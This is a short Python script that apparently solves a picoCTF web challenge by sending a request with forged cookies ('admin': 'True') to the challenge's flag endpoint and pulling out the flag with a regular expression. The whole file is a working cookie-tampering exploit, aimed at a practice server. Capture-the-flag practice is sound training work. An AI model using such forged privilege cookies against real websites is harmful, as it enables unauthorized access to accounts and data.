import requests
import re

cookies = {'time': '1400', 'admin': 'True'}

response = requests.get(
    'https://jupiter.challenges.picoctf.org/problem/64751/flag', cookies=cookies)

content = response.content.decode()

flag = re.findall('picoCTF{.*}', content)[0]
print(flag)
